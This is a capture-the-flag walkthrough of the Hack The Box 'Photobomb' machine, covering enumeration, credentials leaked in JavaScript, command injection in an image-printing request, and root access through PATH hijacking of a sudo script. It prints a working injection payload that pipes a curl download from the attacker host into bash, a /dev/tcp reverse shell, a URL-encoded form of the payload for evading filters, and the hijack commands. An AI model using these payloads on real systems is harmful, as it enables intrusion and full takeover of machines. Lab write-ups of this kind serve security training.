# Photobomb

## 1. Introduction

### 1.1 Background

The **Photobomb** machine from Hack The Box is an <i>Easy</i> Linux challenge that focuses on web enumeration and the exploitation of a **Command Injection** vulnerability within a photo printing application. The goal is to obtain initial access to the system and then escalate privileges to `root` through a misconfiguration of `sudo`.

### 1.1 Objectives

Essential objectives of the _Photobomb_ machine:

- Enumerate exposed services and analyze the web application.
- Exploit a command injection vulnerability to obtain remote access.
- Escalate privileges by abusing insecure permissions in a script executable with `sudo`.

## 2. Enumeration

### 2.1 Initial Reconnaissance

We start by verifying connectivity:

```bash
❯ ping -c1 photobomb.htb
```

The host responded correctly, confirming it was active on the network.

### 2.2 Nmap

A full port scan was performed to identify exposed services:

```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 photobomb.htb -oN allports --open
```

Detected open ports:

- **22/tcp** – SSH  
- **80/tcp** – HTTP  

Then, a more specific scan was executed to detect versions and run NSE scripts:

```bash
❯ nmap -p22,80 -sCV -Pn -oN targeted photobomb.htb
```

Relevant results:

- **SSH:** OpenSSH 8.2p1 (Ubuntu)  
- **HTTP:** nginx 1.18.0 (Ubuntu)  
- Port 80 redirects to `http://photobomb.htb/`  

The domain was added to `/etc/hosts` to properly access the website.

## 2.3 Web Application Analysis

Upon accessing the site, a photo printing application is observed.

Inspecting the source code reveals the file `photobomb.js`, which contains the following:

```
function init() {  
// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me  
if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {  
document.getElementsByClassName('creds')[0]  
.setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');  
}  
}  
window.onload = init;
```

The comment reveals credentials embedded in the URL:

```
pH0t0:b0Mb!
```

This allows authentication via **Basic Auth** and access to the `/printer` panel.

## 3. Exploitation

### 3.1 Vulnerability Identification

Within the printing panel, `.png` images can be downloaded.

By intercepting the request with Burp Suite when pressing the **“Download photo to print”** button, the following request is observed:

```
POST /printer HTTP/1.1

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png&dimensions=3000x2000
```

The `filetype` parameter is vulnerable to **Command Injection**, as user input is not properly validated.

### 3.2 Exploitation – Reverse Shell

A file containing a reverse shell was created:

```
#!/bin/bash  
bash -i >& /dev/tcp/10.10.14.77/443 0>&1
```

An HTTP server was started on the attacker machine:

```bash
❯ python3 -m http.server 8081
```

Then, the intercepted request was modified to inject the following payload into the `filetype` parameter from the attacker machine.

Original payload:

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;curl http://10.10.14.77:8081 | bash&dimensions=3000x2000
```

To bypass possible filters or issues with special characters, the command was sent in **URL-encoded** format:

```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%37%37%3a%38%30%38%31%20%7c%20%62%61%73%68&dimensions=3000x2000
```

Before sending the modified request, a listener was prepared on port 443 to receive the incoming connection:

```bash
❯ nc -lvnp 443
```

When the request was processed on the server, the injected command was successfully executed, establishing a reverse connection and providing interactive access to the system as the `wizard` user.

## 4. Privilege Escalation

### 4.1 Privilege Enumeration

Sudo permissions were checked:

```bash
❯ sudo -l
```

The user could execute the following script as `root`:

```
/opt/cleanup.sh
```

Script content:

```
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

### 4.2 PATH Hijacking Abuse

The script executes the `find` command without specifying its absolute path (`/usr/bin/find`).

This allows a **PATH Hijacking** attack.

A malicious file was created in `/tmp`:

```bash
❯ cd /tmp
❯ echo "/bin/bash -p" > find
❯ chmod +x find
```

Then the script was executed by modifying the `PATH` variable:

```bash
❯ sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

When executed, the system used our `find` binary instead of the original, granting a shell with elevated privileges.

Verification:

```bash
❯ whoami  
root
```
